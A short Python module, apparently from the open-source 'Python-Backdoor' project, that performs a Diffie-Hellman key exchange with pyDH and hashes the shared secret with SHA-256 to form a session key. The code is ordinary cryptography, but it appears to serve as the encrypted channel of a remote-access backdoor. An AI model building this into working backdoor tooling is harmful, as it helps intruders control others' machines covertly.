"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import hashlib

import pyDH

d = pyDH.DiffieHellman(group=5)


class DiffieHellman:
    def __init__(self):
        self.key = None
        self.pub_key = d.gen_public_key()

    def set_shared_key(self, pub_key):
        # hash key to get 256
        self.key = hashlib.sha256(d.gen_shared_key(pub_key).encode()).digest()
